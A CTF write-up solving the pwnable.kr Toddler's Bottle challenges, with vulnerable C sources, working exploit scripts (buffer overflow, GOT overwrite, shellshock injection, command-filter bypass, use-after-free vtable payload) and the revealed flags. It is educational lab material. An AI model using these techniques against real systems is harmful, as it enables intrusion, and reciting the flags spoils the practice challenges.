# The Writeup for Toddler's Bottle Level

## Introduction

This is the first level of the [pwnable.kr](http://pwnable.kr/) practices. All in all, the problems in this level provide a very good introduction to CTF beginners.

## Writeup
### fd

In the Linux environment, file descriptor (FD), which is an unsigned integer,is used in FILE I/O. In the header file \<unistd.h\>:

	0 is STDIN_FILENO, which is the standard input.
	1 is STDOUT_FILENO, which is the standard output.
	2 is STDERR_FILENO, which is the standard error.

The vulnerable c source code is followed.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
``` 

If argv[1] is set as 4660 (0x1234), the variable `fd` will be 0, which is the standard input. And then, we just got the flag when we input `LETMEWIN` on the screen.

-

`mommy! I think I know what a file descriptor is!!`

-

### collision

The design of a hash function should consider the collision. In this task, the hash function is a simple sum function. The source code is followed.

```
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

The destination hash value is 0x21DD09EC, which should be the sum of five unsigned 32bit integers. The integers should not contain '\x00' byte. So that we chose numbers as followed python code, which is stored in the path `/tmp/ex.py` and then print it.

```
#!/usr/bin/env python
import sys

"""
5 32bit integer:
0x01010101
0x01010101
0x01010101
0x01010101
0x1dd905e8
sum: 0x21DD09EC
"""
val = '\x01\x01\x01\x01'*4+'\xe8\x05\xd9\x1d'

sys.stdout.write(val)
```

Then this command will show us the flag.

```
./col `python /tmp/ex.py`
```

-

`daddy! I just managed to create a hash collision :)`

-

### bof

This is a basic buffer overflow task, but the difficulty may be existed in communication to the server. If you receive the following message

`*** stack smashing detected ***: /home/bof/bof terminated`

Please just try shell command in this way in your local shell:

``
(python ex.py ; cat - )  |  nc pwnable.kr 9000
``

The command `cat -` will receive response of the new shell, and make sure the system() will not finish too quick.

The vulnerable source code is followed.

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

And the content of the ex.py is followed.

```
#!/usr/bin/env python

import sys

PRE="A"*0x34
SIGN='\xbe\xba\xfe\xca'
OUT=PRE+SIGN
print(OUT)
```

It maybe a little bit difficult to calculate the distant between the address of `key` and the address of `overflowme`. The easies way is to differ two address of them in GDB. The distant is 0x34 in this case.

The flag is followed.

-
`daddy, I just pwned a buFFer :)`

-

### flag

The binary in this task is packed in UPX format. The first step is unpack the binary to original elf content.

`upx -d flag -o flag.elf`

The output on the screen inspired me.

`I will malloc() and strcpy the flag there. take it.`

There are two ideas in my mind. One is to trace the address of the buffer, which is allocated by malloc(). The other is to set breakpoint at libc function strcpy and then monitor the content of parameters. I chose the later one.

This is my gdb init file.

```
info file
display/i $pc
break strcpy
break malloc
set follow-fork-mode child
```

Then gdb showed the flag.

```
Breakpoint 1, 0x00000000004153a0 in __strcpy_ssse3 ()
1: x/i $pc
=> 0x4153a0 <__strcpy_ssse3>:	mov    %rsi,%rcx
(gdb) p/x $rsi
$1 = 0x496628
(gdb) x/s 0x496628
0x496628:	"UPX...? sounds like a delivery service :)"
```

The flag is.

-
`UPX...? sounds like a delivery service :)`

-

### passcode

A very common mistake is forgetting the address symbol & , when a address is needed.

The vulnerable source code is followed.

```
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}

```

The parameters for the function scanf() should be address, not the value. However, if you insist pass a value to the scanf(), it will be considered as a address.

If we can control the content of the variable passcode1 and passcode2, we will get the flag. The first idea is manipulate the content of the string name[100]. The content of the stack will not be cleaned when the current function is returned. The content in the stack will be reused by the next calling function, which is login() in this case. However, we can only manipulate the initial value of the passcode1, since the variable layout of the stack. The good news is the initial value of the variable passcode1 will be used as a address for the function scanf(). Based on this vulnerability, we can overwrite an 4 byte memory, where the flag is marked as writeable. GOT PLT exploitation technique will be very helpful in this situation. We can overwrite the PLT record of the function exit() to the value 0x80485d7, which is the address of the login ok logic.

The content of ex.py is:

```
#!/usr/bin/env python
import sys
# 0x0804a018 is exit@GOT
val=0x60*'A'+'\x18\xa0\x04\x08'
print(val)
sys.stdout.flush()
# 134514135 is 0x80485d7
# which is the address of the login ok logic
print(134514135)
sys.stdout.flush()
# The second scanf should be failed
print('XXX')
```

Then we use `python /tmp/ex.py | ./passcode` to escape the login check function.

-
`Sorry mom.. I got confused about scanf usage :(`

-

### random

It is a vulnerability that using rand() without initialising the seed firstly.

The vulnerable source code is:

```
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!
    printf("random: %d\n",random);
	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}

```

I found every time, the random value is 1804289383.
The key will be 1804289383 xor 0xdeadbeef, which is 
3039230856

-
`Mommy, I thought libc random is unpredictable...`

-

### input

This task is mainly to train the ability to communicate the testing server.

Linux programming knowledges,such as `pipe` ,`fork`, `execve` and `socket`, are necessary.

The source code is followed.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

The task answer source code exploit.c is followed.

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/param.h>
#include <sys/stat.h> 
#include <fcntl.h>
#include <string.h>
#include <errno.h>
const int argv_len = 101;
char* g_argv[101];
int g_pipe0[2];
char* fd0_text="\x00\x0a\x00\xff";
int g_pipe2[2];
char* fd2_text="\x00\x0a\x02\xff";
char* g_envp[2];
void stage0(){
    chdir("/tmp");
    int ret=symlink("/home/input/flag","/tmp/flag");
    if (-1==ret && errno==EEXIST){
        unlink("/tmp/flag");
        symlink("/home/input/flag","/tmp/flag");
    }
}
void stage1(){
    for (int i=0;i<argv_len;i++){
        g_argv[i]="A";
    } 
    g_argv[0]="/home/input/input";
    g_argv[argv_len-1]=NULL;
    g_argv['A']="\x00";
    g_argv['B']="\x20\x0a\x0d";
    g_argv['C']="65533";
}
void stage2(){
    pipe(g_pipe0);
    pipe(g_pipe2);
}
void stage3(){
    g_envp[0]="\xde\xad\xbe\xef=\xca\xfe\xba\xbe";
    g_envp[1]=NULL;
}
void stage4(){
    int fd = open("\x0a",O_TRUNC|O_WRONLY|O_CREAT);
    if (-1!=fd){
        write(fd,"\x00\x00\x00\x00",4);
        close(fd);
    }     
}
int main(){
    stage0();
    stage1(); 
    stage2();
    stage3(); 
    stage4();
    int ret = fork();
    if (-1==ret){ // error
        printf("fork error:%s\n",strerror(errno));
    }else if (0==ret){ // child
        dup2(g_pipe0[0],0);
        dup2(g_pipe2[0],2);
        int ret=execve(g_argv[0],g_argv,g_envp);
        if (-1==ret){
            printf("execve error:%s\n",strerror(errno));
        }
    }else{ // parrent
        close(g_pipe0[0]);
        close(g_pipe2[0]);
        write(g_pipe0[1],fd0_text,4);
        write(g_pipe2[1],fd2_text,4);
        sleep(3);
        struct sockaddr_in serv_addr;
        int sock = socket(AF_INET,SOCK_STREAM,0);
        memset(&serv_addr,0,sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(atoi(g_argv['C'])); 
        serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
        send(sock,"\xde\xad\xbe\xef",4,0);
        close(sock);
        int stat;
        wait(&stat);
        unlink("\x0a");
    }
    return 0;
}
```

Compile the source code into binary and then `scp` the binary to the server side by command `scp -P 2222 ./exploit  input@pwnable.kr:/tmp/`. The flag is followed after execution through `/tmp/exploit`.

-
`Mommy! I learned how to pass various input in Linux :)`

-

### mistake
The vulnerability in this case is about operator priority. Firstly, the source code is attached.

```
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}

``` 

The vulnerability exists in the line

`fd=open("/home/mistake/password",O_RDONLY,0400) < 0` 

The variable `fd` will be 0, if open function calls successfully.
The vulnerability results the buffer `pw_buf` is assigned by the input from user.

The input works very well:

```
AAAAAAAAAA
@@@@@@@@@@
```

The flag is:

-
`Mommy, the operator priority always confuses me :(`

-

### shellshock

The `shellshock` is a command injection vulnerability which could be conduct through manipulating environment variables in shell.

I tried the command `env x='() { :;}; /bin/cat flag' ./shellshock `, then got the flag.

-
`only if I knew CVE-2014-6271 ten years ago..!!`

-

### coin1

The counterfeit coin will be tested through binary search.
The answer python source code is followed.

```
#!/usr/bin/env python

import re
import socket
from sets import Set

IP= "127.0.0.1"
PORT = 9007
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP,PORT))
BUFF_SIZE=4096
bala=sock.recv(BUFF_SIZE)
print("recv: len:%d"%len(bala))
while (True):
	line = sock.recv(BUFF_SIZE)
	line.rstrip()
	print ("recv: \n"+line)
	pack=re.findall('[0-9]+',line)
	N=0
	C=0
	if 2==len(pack):
		N=int(pack[0])
		C=int(pack[1])
	else:
		print("Game Over!")
	#print("N=%d, C=%d"%(N,C))
	coinList=range(N)
	pickNum = N/2
	roundCnt=0
	while (True):
		roundCnt+=1
		candidateList=[]
		send_text=""
		cand_len=0;
		for i in coinList:
			candidateList.append(i)
			cand_len+=1
			send_text+=(str(i)+" ")
			if cand_len>= pickNum:
				send_text.rstrip()
				send_text+="\n"
				sock.sendall(send_text)
				print("send: "+send_text)
				break;
		ret_text = sock.recv(BUFF_SIZE)
		print("recv: "+ret_text)
		if ret_text.startswith("Correct!"):
			print("Correct!")
			break
		if ret_text.startswith("Wrong"):
			coinList = list(Set(coinList)-Set(candidateList))
		else:
			ret_val = int(ret_text)
			if ret_val == cand_len*10: #all real
				coinList = list(Set(coinList)-Set(candidateList))
			else: # one of then is fake, others are real
				coinList = candidateList
		print("No. %d, coinList: %d"%(roundCnt,len(coinList)))
		if 1==len(coinList):
			fake_ind = coinList[0]
			while roundCnt<=C:
				roundCnt+=1
				sock.sendall(str(fake_ind)+"\n")
				print("send: "+str(coinList[0]))
				ret_text = sock.recv(BUFF_SIZE)
				print("No.%d recv: %s"%(roundCnt,ret_text))
				if ret_text.startswith("Correct!"):
					print("Correct!")
					break
			break
		pickNum=len(coinList)/2
sock.close()
```

The flag is:

-
`b1NaRy_S34rch1nG_1s_3asy_p3asy`

-

### blackjack
The vulnerability of the source code is about semantic check. the bet checking will be failed at the second times. And user can also input a negative number, then magic will happen when you lose a game. This vulnerability is found by my lovely wife.

The source code is followed.

```
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);
 
 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
```

The flag is.

-
`YaY_I_AM_A_MILLIONARE_LOL`

-

### lotto
The vulnerability exists in the logic of the calculation of the lotto mark.

```
// calculate lotto score
int match = 0, j = 0;
for(i=0; i<6; i++){
	for(j=0; j<6; j++){
		if(lotto[i] == submit[j]){
			match++;
		}
	}
}
```

It is high probable that a submit[j] is equal to any of the character of lotto[].

This is my solution.

```
#!/usr/bin/env python
import sys
for i in range(10):
    print(1)
    sys.stdout.flush()
    sys.stdout.write(' '*6+'\n')
    sys.stdout.flush()
```

The flag is.

-
`sorry mom... I FORGOT to check duplicate numbers... :(`

-

### cmd1
The environment variables, such as PATH and HOME, can be overwritten by `/bin/env`.

The vulnerable source code is attached.

```
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/fuckyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```
Soft link can be used to bypass string filter.

Following commands will print the content of the flag.

```
cd /tmp
ln -s /home/cmd1/flag x
/home/cmd1/cmd1 '/usr/bin/env PATH=. /bin/cat x'
```

-
`mommy now I get what PATH environment is for :)`

-

### cmd2
The filter is stronger in this problem.

```
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

```

My solution is.

```
cd /bin
/home/cmd2/cmd2 ' PATH=. sh '
cat /home/cmd2/flag
```

The flag is.

-
`FuN_w1th_5h3ll_v4riabl3s_haha`

-

### uaf
The Use After Free (UAF) is a vulnerability that causes a program to crash, use unexpected value and even execution code.

the vulnerable source code is followed.

```
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

There are three stages in the UAF vulnerability exploit. The first one is to use. In this task, two objects is allocated by new operator. Then in Case 3, these two pointer is deleted, which means the memory allocated before are returned to the memory allocator. However, the value of pointers are not cleared. The piece of memory will be reallocated in Case 2, which means the content of memory is manipulated by user input. Finally, in Case 1 `m->introduce()` is a function call, the address of the function is in the Vtable of the object. If we can manipulate the content of the Vtable, we can lead the execution flow to the function `give_shell()`.

Following gcc command will show the class structs.

```
g++ -fdump-class-hierarchy uaf.cpp
cat uaf.cpp.002t.class | c++filt
```

The following python code is to construct the Vtable.

```
#!/usr/bin/env python

import sys

val="\x68\x15\x40\x00\x00\x00\x00\x00"*3
sys.stdout.write(val)
sys.stdout.flush()
```

The shell command is.

```
python /tmp/ex.py > /tmp/x
./uaf 24 /tmp/x
```

Then the input sequence is 3,2,2,2,2,2,1

My gdb init script is followed.

```
info file
display/i $pc
break main
set follow-fork-mode child
run 24 heap.dat < input.dat  
```

The flag is.

-
`yay_f1ag_aft3r_pwning`

-
## Conclusion
In conclusion, problems in this level is basic. We learned the communication skills and realised basic algorithm is necessary. Some problems also need creative thinking. Two typical vulnerabilities, which are shellshock(CVE-2014-6271) and user after free (CWE-416) deserve to be researched carefully.
## References
1. [rk700](http://rk700.github.io/tags.html#pwnable.kr-ref)
2. [CWE-416: Use After Free](https://cwe.mitre.org/data/definitions/416.html)